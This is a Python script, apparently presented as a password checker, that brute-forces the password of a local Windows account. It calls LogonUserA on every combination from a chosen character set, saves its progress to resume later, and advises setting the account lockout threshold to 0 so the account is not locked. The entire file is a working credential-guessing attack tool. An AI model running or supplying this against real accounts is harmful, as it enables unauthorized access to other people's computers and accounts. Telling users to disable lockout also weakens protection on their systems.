import ctypes
import win32security
import subprocess
import win32api
import itertools
import string
import time
import json
import os
import sys

from list_users import list_users
from load_and_save_progress import load_progress, save_progress
from logo import logotip_password_checker
from characters_for_password import charactes_password

logotip = logotip_password_checker()

print("Убедитесь в том что у вас 'Пороговое значение блокировки: 0', иначе у вас заблокируют учетную запись!\n")
print(f"Автор: separeit894\n"
      f"Ccылка на github: https://github.com/separeit894/")

users_list = list_users()


LOGON32_LOGON_INTERACTIVE = 2
LOGON32_PROVIDER_DEFAULT = 0

characters = ''

progress_file = "progress.json"

# Изменить этот параметр, если не хотите видеть все попытки
print_try = "y"

# Загрузка прогресса
progress = load_progress()
if progress:
    account = progress['account']
    i = progress['length']
    try_id = progress['try_id']
    tryed = progress['tryed']
    characters = progress['characters']
    # print_try = progress['print_try']
else:
    i = 1
    try_id = 0
    tryed = []
    # Указываем имя пользователя и пароль
    while True:
        account = str(input("Введите имя учетной записи: "))
        if account in users_list:
            print("Учетная запись найдена")
            break
        else:
            print("Учетная запись не найдена!\n Введите имя учетной записи еще раз")

    level = 0
    while True:
        if characters == "":
            if level > 1:
                print(f"\nВы должны что-то выбрать!\n")
            characters = charactes_password(characters)
            level += 1
        else:
            break

username = account  # Замените на ваше имя пользователя

found = False
# time_start = int(time.time())
# questions = input("Вы хотите видеть все попытки? (y/n): ").strip().lower()
try:
    while not found:
        for password in itertools.product(characters, repeat=i):
            password = "".join(password)
            if not password in tryed:
                try_id += 1
                # Попытка входа в систему
                token = ctypes.c_void_p()
                result = ctypes.windll.advapi32.LogonUserA(
                    username.encode('utf-8'),
                    None,  # Укажите домен, если необходимо
                    password.encode('utf-8'),
                    LOGON32_LOGON_INTERACTIVE,
                    LOGON32_PROVIDER_DEFAULT,
                    ctypes.byref(token)
                )

                if print_try == "y":
                    if result:
                        print(f"Попытка № {try_id} увенчалась успехом. Вход выполнен успешно для пароля: {password}")
                        found = True
                        break
                    else:
                        print(f"Попытка № {try_id} увенчалась ошибкой {win32api.GetLastError()} для пароля: {password}")
                        tryed.append(password)
                        if win32api.GetLastError() == 1909:
                            print("Ошибка 1909 означает, то что ваша учетная запись заблокировалась\n\tКонец работы")
                            sys.exit()

                else:
                    if result:
                        print(f"Попытка № {try_id} увенчалась успехом. Вход выполнен успешно для пароля: {password}")
                        found = True
                        break
                    else:
                        if try_id % 250 == 0:
                            print(f"Попытка № {try_id} увенчалась ошибкой {win32api.GetLastError()} для пароля: {password}")
                        tryed.append(password)
                        if win32api.GetLastError() == 1909:
                            print("Ошибка 1909 означает, то что ваша учетная запись заблокировалась\n\tКонец работы")
                            sys.exit()

                # Сохраняем прогресс после каждой попытки
                save_progress(account, characters, i, try_id, tryed)

        # Увеличиваем длину пароля, если не нашли подходящий
        if not found:
            i += 1

except KeyboardInterrupt:
    save_progress(account, characters, i, try_id, tryed)
    print("Программа прервана. Прогресс сохранен.")

except Exception as ex:
    print("Произошла ошибка: ", ex)

# time_finish = int(time.time() - time_start)
# print(f"{time_finish} секунд(ы)")